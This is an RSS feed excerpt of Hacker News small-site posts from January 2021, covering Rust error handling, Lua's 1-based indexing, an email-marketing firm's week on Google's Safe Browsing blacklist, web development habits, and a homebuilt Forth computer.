<div><pre><code data-lang="rust"><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span> </span><span>/* .. */</span><span> </span><span>}</span><span>
</span></code></pre></div><p>Compared to the previous version, our new code is a lot more specific.
Users now get a lot more insight into the possible error cases that might be returned.
As an added benefit, we also no longer have to Box <code>Error</code> because the size of <code>WordCountError</code> can be determined at compile time.</p>
<h3 id="returning-library-errors">Returning library errors</h3>
<p>In <code>WordCountError</code> above we specify three possible types of error.</p>
<p><code>EmptySource</code> may be ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nick.groenen.me/posts/rust-error-handling/">https://nick.groenen.me/posts/rust-error-handling/</a></em></p>]]>
            </description>
            <link>https://nick.groenen.me/posts/rust-error-handling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805340</guid>
            <pubDate>Sat, 16 Jan 2021 20:44:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Letter to New Science Advisor Eric Lander from President-Elect Biden [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25804848">thread link</a>) | @kosei
<br/>
January 16, 2021 | https://buildbackbetter.gov/wp-content/uploads/2021/01/OSTP-Appointment.pdf | <a href="https://web.archive.org/web/*/https://buildbackbetter.gov/wp-content/uploads/2021/01/OSTP-Appointment.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://buildbackbetter.gov/wp-content/uploads/2021/01/OSTP-Appointment.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25804848</guid>
            <pubDate>Sat, 16 Jan 2021 19:46:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cult of Leica]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25804765">thread link</a>) | @aaronbrethorst
<br/>
January 16, 2021 | http://leicaphilia.com/the-cult-of-leica/ | <a href="https://web.archive.org/web/*/http://leicaphilia.com/the-cult-of-leica/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://leicaphilia.com/the-cult-of-leica/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25804765</guid>
            <pubDate>Sat, 16 Jan 2021 19:35:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why 1-based indexing is right for Lua]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25804661">thread link</a>) | @adnzzzzZ
<br/>
January 16, 2021 | https://a327ex.github.io/blog/lua-1-index | <a href="https://web.archive.org/web/*/https://a327ex.github.io/blog/lua-1-index">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><small><i>published on: 2021-01-16</i></small><br><small><i>last updated on: 2021-01-16</i></small></p></div></div><!--
title: Why 1-based indexing is right for Lua
date: 2021-01-16
update: 2021-01-16
-->

<p>Programming can be looked at from the lens of borders vs. no borders.</p>
<p>People who like borders do so because ideas and concepts, when properly defined in their boxes, can be more easily manipulated and fit into existing processes. This diminishes the cognitive load of working in an otherwise chaotic environment.</p>
<p>People who dislike borders do so because they want to mix and match ideas and concepts so that something new emerges out of it. They thrive in the chaos despite the higher cognitive load environment that comes with it.</p>
<p>In general, languages that are dynamically typed are more borderless than bordered, and the reverse is true for statically typed ones. Lua is dynamically typed, therefore it's a more borderless language. However, Lua is not only dynamically typed, it also has borderlessness as its core philosophy.</p>
<p>Lua asks of its users to mix and match its basic elements into something new continuously. From the way tables work to the way coroutines work, the authors made sure that it had building blocks that were flexible and useful enough that they could be shaped into whatever the user needed. <em>That</em> is the fundamental spirit of the language. It's not a batteries included language because it wants you, the user, to figure out what you need, and to build it yourself.</p>
<p>What does this have to do with 1-based indexing? People who like borders like them because they decrease cognitive load. There's a good argument to be made that because programming convention is 0-based indexes, Lua should just follow it, which would decrease the cognitive load of working with it. This is true. There's also a good argument to be made that Lua should be a more batteries included language because that makes it more useful generally. This is also true.</p>
<p>But Lua, as I just explained, is a fundamentally borderless language. Its entire way of operating constantly places the user in a very borderless and chaotic environment by design where they constantly have to mix and match its basic building blocks to do things from scratch themselves. <em>"It's taxing, it's unnecessary"</em>, the bordered thinker would say.</p>
<p>People who don't like such borderless environments will not like Lua. Maybe those people should have early signals available to them that they won't like the language? I think there's hardly a better way to do that than to break small conventions left and right, like indexing.</p>
<p>So it is my argument that 1-based indexing acts as a barrier against people who wouldn't enjoy Lua in the first place. If you're the kind of person who doesn't want to deal with the very small increased cognitive load that comes with 1-based indexing, you're likely not going to want to deal with the larger amounts of it that come with using the rest of the language.</p>
<p>I obviously don't think this happened intentionally, it's just a happy coincidence. I also don't think that language designers should break (or follow) conventions mindlessly. In this case this convention break makes sense, but it wouldn't make sense for instance to make it 2-indexed, as that obviously serves no purpose.</p>
<p>I also don't think there's anything wrong with people who don't enjoy borderlessness environments, dynamic typing or 1-based indexes in general. Everyone has different preferences. But I definitely think those people shouldn't be using Lua and that the language shouldn't be catering to them, and that's a good thing.</p>
<br>
      
      <br>
      
      <br>
    
  </div>]]>
            </description>
            <link>https://a327ex.github.io/blog/lua-1-index</link>
            <guid isPermaLink="false">hacker-news-small-sites-25804661</guid>
            <pubDate>Sat, 16 Jan 2021 19:22:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google‚Äôs Safe Browsing program made my week hell]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25804505">thread link</a>) | @cft
<br/>
January 16, 2021 | https://www.gmass.co/blog/google-safe-browsing/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-safe-browsing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9020">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Google‚Äôs <a href="https://safebrowsing.google.com/">Safe Browsing</a> program protects a lot of people from <strong>phishing</strong>, <strong>malware</strong>, and other harmful sites. In fact, it‚Äôs so pervasive that it‚Äôs not just used by Chrome. Google has managed to get competing browsers,&nbsp;<strong>Safari and</strong>&nbsp;<strong>Firefox,</strong>&nbsp;to use it as well. The list of websites blacklisted though is all maintained by Google, giving Google&nbsp;a&nbsp;disproportionate amount of power over what sites are seen versus blocked.</p>
<p>I‚Äôll explain what happened during our harrowing week in a moment; but first, let me share an <strong>update about Google‚Äôs Safe Browsing API</strong>:</p>
<ul>
<li>Effective September 11, 2019, the <strong><a href="https://developers.google.com/safe-browsing">Safe Browsing API</a></strong> is limited to non-commercial use only. It is a free service.</li>
<li>If you‚Äôre a <strong>non-commercial user</strong>, you can continue to use the Safe Browsing API, and you don‚Äôt need to take any action. Also, a<span data-preserver-spaces="true">cademic researchers and NGOs will continue to be eligible to use the Safe Browsing API at no cost.&nbsp;</span></li>
<li><strong>Commercial users</strong>, like GMass, are required to switch to the <strong><a href="https://cloud.google.com/web-risk/">Web Risk API</a></strong> by November 11, 2019. This version is a paid service, and if you‚Äôre a commercial user, as we are, then you‚Äôll need to switch. Also, you‚Äôll need to apply and be approved to use the API, so don‚Äôt wait.</li>
<li>Both APIs are directed at protecting users from malware and phishing, but the new Web Risk API is designed specifically for larger users.</li>
</ul>
<p>And now, back to our story ‚Ä¶</p>
<h3>What happened?</h3>
<p>At the beginning of last week, my team&nbsp;suddenly had a deluge of complaints from <strong>users reporting that their links had stopped working</strong>, their <strong>sending limits had been reduced</strong>, and they‚Äôd <strong>received phishing notifications from Google</strong>. Ouch! Upon investigating, we found that the tracking domains they use in their email campaigns&nbsp;had ended up on the Google‚Äôs Safe Browsing blacklist, and when people clicked links in their campaigns, they ended up on this scary bright red Google warning page.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Gmail-Dangerous-Warning-Link-Wordzen-Com-web.png" alt="" width="1685" height="613">There‚Äôs the rub. <em>Not only does Google list actual phishing sites, but any sites that re-direct to them as well.</em> That makes it so that any providing click-tracking services, including <strong>URL shorteners</strong> and <strong>email marketing service providers</strong>, have to be extra cautious.</p>
<p>In slogging through our logs we found that a Netflix phisher had managed to send 200 emails through GMass on Sunday, February 17. Here‚Äôs the email he sent. Notice that the URL behind the link is highlighted at the bottom. In this case, the URL https://www.gregsimages.com/cgi-bin led to the red screen of death, as did our click-tracked links that redirected to this URL.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-Netflix-Email-web.png" alt="" width="1333" height="574"></p>
<h3>The effect of being listed goes beyond just the web</h3>
<p>What happens to your email campaigns when you send a URL that‚Äôs on this list? Gmail makes you&nbsp;feel like the devil reincarnate.</p>
<ol>
<li>Your Gmail account&nbsp;becomes <strong>severely limited</strong> and&nbsp;<strong>unable able to send any substantial volume</strong> of emails.</li>
<li>If you do manage to&nbsp;send an email with a blacklisted link,&nbsp;and that link is clicked, you‚Äôll <strong>scare the&nbsp;bejesus out of them</strong> with&nbsp;the red screen of death.</li>
<li>Your <strong>past campaigns are affected</strong> too, if someone pulls up one of those old emails and clicks a link.</li>
<li>If people <strong>reply</strong> to you, the reply will still have the original email at the bottom, with the link that you sent, and Google <strong>will flag the <em>reply to you</em> as a potential scam</strong> too.<br>
<img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Gmail-Dangerous-Warning-web.png" alt="" width="2509" height="1618"></li>
</ol>
<p>Obviously not a good look for an email marketer.</p>
<h3>What was actually affected?</h3>
<p>In our case, when we got the notice that <strong>link.wordzen.com was listed</strong>, I wanted to <strong>isolate which link.wordzen.com URLs were affected</strong>.</p>
<p>Using the public <a href="https://transparencyreport.google.com/safe-browsing/search?hl=en">Safe Browsing lookup tool</a>, which is different from the private tool everyone has in their <strong>Search Console</strong>, I found that plugging in just link.wordzen.com gave this result, indicating that some URLs were affected and others weren‚Äôt:</p>
<figure id="attachment_4078" aria-describedby="caption-attachment-4078"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Safe-Browsing-Lookup-Some-Unsafe-web.png" alt="" width="3168" height="1874"><figcaption id="caption-attachment-4078">Just ‚Äúlink.wordzen.com‚Äù indicates that SOME pages are unsafe.</figcaption></figure>
<p>But if I plugged in our original click tracking structure, link.wordzen.com/x/c, then the issue was clear that all /x/c links were blacklisted</p>
<figure id="attachment_4079" aria-describedby="caption-attachment-4079"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Safe-Browsing-Lookup-Unsafe-web.png" alt="" width="3180" height="1798"><figcaption id="caption-attachment-4079">Using our old click-tracking link structure shows that all URL redirects using link.wordzen.com are unsafe.</figcaption></figure>
<p>Curious, though, I wondered what would happen if I changed the URL slightly, so I tried link.wordzen.com/x/d and found that those URLs came back clean</p>
<figure id="attachment_4082" aria-describedby="caption-attachment-4082"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Link-Wordzen-Com-Safe-web-1.png" alt="" width="3180" height="1204"><figcaption id="caption-attachment-4082">Slightly altering the link structure makes the link safe again.</figcaption></figure>
<p>You‚Äôll see below that this discovery led me to change the structure of a click-tracked link.</p>
<h3>Some&nbsp;nonsense associated with the Safe Browsing Program</h3>
<h5><span>1. Despite claims of transparency, it‚Äôs anything but.</span></h5>
<p>As soon as your domain has been listed, you will probably want to know the URL that caused the issue. Unfortunately for you, <strong>Google won‚Äôt tell you</strong>. In the <strong>Search Console</strong> you might see this:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Google-Search-Console-Blacklisted-web-1.png" alt="" width="1240" height="942"></p>
<p>If you received an email notification about the blacklisting, that will have a portion of the URL.</p>
<figure id="attachment_4039" aria-describedby="caption-attachment-4039"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Social-Engineering-Email-Notification-web-1.png" alt="" width="1132" height="1241"><figcaption id="caption-attachment-4039">The email notification you receive provides some clue as to the offending URL, while the notice in the Search Console gives you NO worthwhile info.</figcaption></figure>
<p>For my purposes, this did not help at all, because every click-tracked link in the history of GMass starts with /x/c. The important stuff is all <em>after</em> that part, and that‚Äôs the part that Google eliminates from its reports. <strong>How this qualifies as transparency is beyond me.</strong></p>
<p><em>So what do you do now?</em> You crawl through your logs and figure out what happened. In my case, I ran all sorts of analyses, starting with a time distribution analysis of all clicks in the last 72 hours, looking for anomalies. I also discovered my new best friend, a tool from Microsoft called <a href="https://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765">Log Parser Studio</a>, that lets me run SQL queries against my IIS log files, <em>without importing the log files</em> into a database. Slick! That‚Äôs how I concluded that the aforementioned Netflix phisher was the culprit.</p>
<h5><span>2. The Safe Browsing API has been broken since day one.</span></h5>
<p>I‚Äôm <a href="https://groups.google.com/forum/#!topic/google-safe-browsing-api/pdVIo3qXsGk">not the only one</a>&nbsp;who‚Äôs&nbsp;frustrated over&nbsp;the seemingly useless <a href="https://developers.google.com/safe-browsing/v4/">Safe Browsing API</a>.</p>
<p>Here‚Äôs a screenshot showing the listing of link.wordzen.com.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Google-Search-Console-Blacklisted-web.png" alt="" width="1240" height="942"></p>
<p>Here‚Äôs a screenshot showing the API result:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-API-Fail-web.png" alt="" width="2121" height="969"></p>
<p>So with a useless API, how does one monitor whether new URLs have been listed or old URLs have been marked safe? I used Upwork to quickly a hire a team of <strong>Virtual Assistants in the Philippines</strong> to <strong>manually enter all 1,400</strong> of our customers‚Äô tracking domains into the web lookup tool and to do so <strong>every 12 hours until further notice</strong>.</p>
<p>In case you‚Äôre a C# programmer and want to try this yourself, here‚Äôs the code:</p>
<pre><span>            string</span><span> apikey = </span>"AIzaSyBnIDLCc*************z4twxdx28"<span>;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;   </span><span>string</span> payload = <span>@"{</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""client"": {
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""clientId"":<span>&nbsp; &nbsp; &nbsp; </span>""gmass"",
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""clientVersion"": ""1.0.0""
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>},

<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatInfo"": {
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatTypes"":<span>&nbsp; &nbsp; &nbsp; </span>[""MALWARE"", ""SOCIAL_ENGINEERING"", ""UNWANTED_SOFTWARE"", ""POTENTIALLY_HARMFUL_APPLICATION""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""platformTypes"":<span>&nbsp; &nbsp; </span>[""WINDOWS""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatEntryTypes"": [""URL""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatEntries"": [
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>{""url"": ""http://link.wordzen.com""}
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>]
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}"<span>;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>using</span> (<span>var</span> client = <span>new</span> <span>HttpClient</span>())
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>{
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>var</span> content = <span>new</span> <span>StringContent</span>(payload, <span>Encoding</span>.Default, <span>"application/json"</span>);
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>var</span> response = client.PostAsync(<span>$"https://safebrowsing.googleapis.com/v4/threatMatches:find?key=</span>{apikey}<span>"</span>, content).Result;
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>string</span> resultContent = response.Content.ReadAsStringAsync().Result;
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}</pre>
<p>There is also a <a href="https://developers.google.com/api-client-library/dotnet/apis/safebrowsing/v4">.NET client library for the Safe Browsing API</a>, but I chose not to use it because I wanted to be&nbsp;in control of the exact JSON payload request&nbsp;so that I knew that I wasn‚Äôt making a mistake.</p>
<h5><span>3. Reviews take a long time to process.</span></h5>
<p>Despite <a href="https://developers.google.com/web/fundamentals/security/hacked/request_review">Google‚Äôs claims</a><strong> that a phishing URL will be reviewed within 24 hours</strong> and a <strong>malware&nbsp;URL&nbsp;within 72 hours</strong>, I found it <strong>took more like 120 hours (5 days)</strong>. After a week of hell though, there‚Äôs no sweeter email one can receive than this, clearing your&nbsp;domain off the dreaded blacklist:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-Review-Successful-web.png" alt="" width="943" height="786"></p>
<p>You can submit each URL for review, and in our case, we did it for hundreds of our customers too.</p>
<h3>How&nbsp;I worked around the blacklisting of 300 domains</h3>
<p>During the time our customers‚Äô domains were listed, we couldn‚Äôt just sit idle&nbsp;waiting for Google, because customers needed to&nbsp;send their email campaigns out. We took a number of counter-measures and you can take these too, should you find yourself in this situation.</p>
<h5><span>1. Removed&nbsp;all affected customer tracking domains from their accounts</span></h5>
<p>The first step we took was to remove all the affected tracking domains from users‚Äô accounts, causing them to fall back to our shared tracking domain, which for paying users, is a clean domain based on Amazon‚Äôs AWS domain. That eliminated the issue in future campaigns.</p>
<h5><span>2. Altered structure of click tracking link</span></h5>
<p>I felt a little shady making this change system-wide, but it turned out it worked, and saved me from an ever-growing mob of angry users. The old structure of a click-tracked link looked like:</p>
<pre>http://link.wordzen.com/x/c?c=2724793&amp;l=dedb940f-55dd-4c33-a3cc-f5d8028183ca&amp;r=ed06197e-cf9e-4fea-a371-d5f455968519</pre>
<p>By&nbsp;plugging various combinations of URL structures into the <a href="https://transparencyreport.google.com/safe-browsing/search?hl=en">lookup tool</a>, we noticed that the link above was flagged as dangerous, but if we made a simple change, changing the /c to /d, then the URL came back as safe, so we changed the structure of links to use /d instead of /c, like this:</p>
<pre>http://link.wordzen.com/x/d?c=2724793&amp;l=dedb940f-55dd-4c33-a3cc-f5d8028183ca&amp;r=ed06197e-cf9e-4fea-a371-d5f455968519</pre>
<p>Of course for backward compatibility, we made sure that the /c URLs still worked also.</p>
<p>Making this change allowed users to keep using their custom tracking domain, even if their tracking domain was still listed in the Safe Browsing system as a potential phishing domain.</p>
<h5><span>3. Locked down how click-tracking works to prevent future issues</span></h5>
<p>I should have implemented this from day one, but I could have never expected an evildoer to exploit this loophole. You may know that to set up a custom tracking domain, you create a sub-domain off your existing domain and set its CNAME to x.gmtrack.net. So in my ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gmass.co/blog/google-safe-browsing/">https://www.gmass.co/blog/google-safe-browsing/</a></em></p>]]>
            </description>
            <link>https://www.gmass.co/blog/google-safe-browsing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25804505</guid>
            <pubDate>Sat, 16 Jan 2021 19:06:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I develop web apps in 2021]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25803840">thread link</a>) | @timdaub
<br/>
January 16, 2021 | https://timdaub.github.io/2021/01/16/web-principles/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2021/01/16/web-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>It's now roughly seven or eight years that I'm building dynamic front ends for the web. From <a target="_blank" rel="noopener" href="https://www.ascribe.io/">digital art wallets</a> to games (<a target="_blank" rel="noopener" href="https://ipfs.leapdao.org/blog/Planet-A-ccc-ethberlin-recap/">1</a>, <a href="https://timdaub.github.io/videogame">2</a>) and <a href="https://timdaub.github.io/wasm-synth">synthesizers</a>, I've seen it all. And since my process of creation has dramatically changed over the years, today, I'd like to share how I'm developing web apps in 2021.</p>
<h2 id="i-avoid-build-processes.">I avoid build processes.</h2>
<p>I still remember the debates with colleagues about using <a target="_blank" rel="noopener" href="https://babeljs.io/">babel</a> a few years ago. Within the front end development world, transpiling had just become a thing, so we ended up babelifying our builds to use ES6. Our argument back then was that one day, we would be able to push our application's directory structure on a web server and since all browsers would then support the augmented ES6 features, our app would just work! Without a build process. WOW! That must have been around 2015. When I look at the source code of these old applications now, our technical visions didn't end up becoming reality.</p>
<p>Now, I try to keep my build process to a minimum. When I need to write a demo app, I particularly like using <a target="_blank" rel="noopener" href="https://babeljs.io/docs/en/babel-standalone#script-tags"><code>&lt;script type="text/babel"&gt;</code></a>. I love <a target="_blank" rel="noopener" href="https://preactjs.com/guide/v10/getting-started/#no-build-tools-route">preact's "no build tools route."</a> too. When I have to set up an actual app, I avoid <a target="_blank" rel="noopener" href="https://webpack.js.org/">webpack</a> and <a target="_blank" rel="noopener" href="https://rollupjs.org/">rollup</a>. I mainly get frustrated about the myriad ways of configuring them. Some minor thing always ends up being broken, which leads to hours of debugging foreign code. And that's frustrating. Using preact's no build route, finally something like the above is possible:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>&lt;script type=<span>"module"</span>&gt;</span><br><span>  </span><br><span>  <span>import</span> { h, Component, render } <span>from</span> <span>'https://unpkg.com/preact?module'</span>;</span><br><span>  <span>const</span> app = h(<span>'h1'</span>, <span>null</span>, <span>'Hello World!'</span>);</span><br><span>  render(app, <span>document</span>.body);</span><br><span>&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>When having to use a build tool, I gravitate towards <a target="_blank" rel="noopener" href="https://parceljs.org/">parcel</a> or <a target="_blank" rel="noopener" href="https://github.com/developit/microbundle">microbundle</a> as they come preconfigured. And in particular, parcel is excellent, as it's merely using an HTML file as its entry point. To me, that's promising as it assumes a proper directory structure and properly connected files such that maybe one day I can push my app to the web without that build step.</p>
<h2 id="i-avoid-transpiling.">I avoid transpiling.</h2>
<p>For the same reasons as pointed out above, I also try to avoid transpiling. It's not because I don't like ESNext features, but more because I want to minimize the risk of getting stuck with the transpiler. Hence, I try to avoid using babel. <a href="https://timdaub.github.io/2020/09/01/typescript/">I also don't use Typescript</a>. To me, JavaScript is productive enough. Additionally, for <a target="_blank" rel="noopener" href="https://reactjs.org/">react</a>-style projects, no transpilers mean I stopped using <a target="_blank" rel="noopener" href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>. Instead, I found an excellent library called <a target="_blank" rel="noopener" href="https://github.com/developit/htm">htm</a> that uses JavaScript's template strings. It has a similar syntax to JSX, but it's not breaking ECMAScript standards and hence needs no transpliation.</p>
<h2 id="i-avoid-the-new-and-shiny.">I avoid the <em>new</em> and <em>shiny</em>.</h2>
<p>I even avoid changing the way I work if I don't feel comfortable or inclined. For example, I never switched to <a target="_blank" rel="noopener" href="https://reactjs.org/docs/hooks-intro.html">react hooks</a>. The <a target="_blank" rel="noopener" href="https://reactjs.org/docs/state-and-lifecycle.html">lifecycle methods</a> that I initially know from iOS Objective-C programming are - in my opinion - a beautiful metaphor for writing front end components. And neither did I have any issues with my sites' performance. I would make the switch if I started to have problems. But I don't. The same goes for up and coming frameworks. Angular V2? <a target="_blank" rel="noopener" href="https://svelte.dev/">Svelte</a>? Cool, but why relearn a framework when I'm already productive with the one I use?</p>
<h2 id="i-test-everything.">I test EvErYtHiNg.</h2>
<p>When I started front-end development, testing was complicated. Only a few front end developer colleagues tested their apps properly. I ended up doing a lot of testing by hand. It was frustrating and unproductive. But testing front ends has improved dramatically over the years. Not only have the tools been significantly enhanced.</p>
<p>We, as front-end developers, have now also figured out how to correctly write front end tests. Finally, we're able to distinguish between functional code and presentational code. For functional code, we now write unit tests. For presentational code, we use snapshot-based testing and integration tests. I'm pleased about tools like <a target="_blank" rel="noopener" href="https://www.cypress.io/">cypress</a> that is great for integration tests. I also like <a target="_blank" rel="noopener" href="https://github.com/avajs/ava/">ava</a> for unit tests.</p>
<h2 id="i-optimize-for-performance-and-quality.">I optimize for performance and quality.</h2>
<p>I used to be eager about building extensively functional software: the more features, the better. I'm not anymore. Instead, I try to develop software that works well for my users. I strive for quality. So I try to measure my build's size. I take proper care about delivering my application, meaning I turn on compression and <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">caching</a>. I care about optimizing my static assets like pictures. And I like to check my apps by using tools like <a target="_blank" rel="noopener" href="https://developers.google.com/speed/pagespeed/insights/?hl=de">PageSpeed Insights</a> or <a target="_blank" rel="noopener" href="https://developers.google.com/web/tools/lighthouse">lighthouse</a>.</p>
<h2 id="i-use-my-own-work">I use my own work</h2>
<p>From experience, I learned that I hardly ever get stuck on a algorithmic problem. On the contrary, I get motivated to learn something new and excel in the process. However, I caught my self often spending many hours on debugging other people's code. Mainly when it's third-party libraries that I included via npm. Once, I thought that using npm packages was a JavaScript developer's superpower. Now, I know that it can also be their curse.</p>
<p>Instead of collecting heaps of third-party code, I now prefer following <a target="_blank" rel="noopener" href="http://hintjens.com/blog:96">Peter Hintjens' principles for writing good code</a>. I "use my own work." Meaning, I dare to write seemingly complex code myself. I still won't roll my own crypto or write a date library, but I dare to implement parts of a protocol or build an algorithm. It's not to say that I ditch every npm package and go npm-keto-diet. No, instead, I take a more mindful approach towards dependencies and only include them when I truly need them.</p>
<p>I try to do that by leaving my technical vision at the doorstep of my office, so that I can now focus on solving the problems at hand. I try to stop worrying about eventualities far in the future as I view that as speculation. In cases I have past experiences, I use it to form my decision. For unchartered teritory, I move carefully, step by step.</p>
<h2 id="i-use-open-source-to-my-advantage.">I use open source to my advantage.</h2>
<p>I'm building websites since I'm a teenager. And had I open-sourced and maintained a few pieces of code that I need frequently, I'd be more productive now. Unfortunately, I was short-sighted. Surprisingly, I didn't think about still using JavaScript at 29 years of age üòÇ</p>
<p>I stopped framing open source mainly around certain virtues like free speech, fairness or certain politics. They're still important virtues for me, but I learned that I could use open source also for building a personal toolset.</p>
<p>Extracting a library from a codebase allows me to think about it from a user's perspective. It means I'm able to think about a piece of code's interfaces emphatically. Additionally, there's positive peer pressure. I'm not going to release shit to the world. When my project is public, it's going to have a proper README and some docs. And it's going to be tested. Since everybody can see it, I might as well create something I can be proud of.</p>
<p>Hence, contributing to open source, for me, is about building high-quality software. Being anxious about not being able to monetize this particular piece of code has become less of a concern. <a target="_blank" rel="noopener" href="https://github.com/sindresorhus">sindresohrus</a> inspired me to treat open source packages like my personal toolbox.</p>
<h2 id="conclusion">Conclusion</h2>
<p>And that's my incomplete list of principles. I'm sure there's more than just these. Anyway, I still find some of these points quite controversial. I'm sure they won't work for everyone as all our contexts differ. But working solo as a freelancer, I've found that these principles contribute to me being content about what I'm doing. Hence, I was eager to share them.</p>
<p>I'm curious to hear other's thoughts and see if they've taken similar paths. Please reach out! Also, don't forget to subscribe to my newsletter!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2021/01/16/web-principles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803840</guid>
            <pubDate>Sat, 16 Jan 2021 17:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mark 1 Homebuilt Forth Computer (TTL only, no microprocessor)]]>
            </title>
            <description>
<![CDATA[
Score 107 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25803748">thread link</a>) | @peter_d_sherman
<br/>
January 16, 2021 | http://www.aholme.co.uk/Mk1/Architecture.htm | <a href="https://web.archive.org/web/*/http://www.aholme.co.uk/Mk1/Architecture.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<table>
<tbody><tr>
<td><b>Architecture</b></td>
<td><a href="http://www.aholme.co.uk/Mk1/Photos.htm">Photos</a></td>
<td><a href="http://www.aholme.co.uk/Mk1/Schematics.htm">Schematics</a></td>
<td><a href="#More">More homemade computers</a></td>
<td><a href="http://www.aholme.co.uk/Projects.htm">Back to projects</a></td>
</tr>
</tbody></table>
<hr>
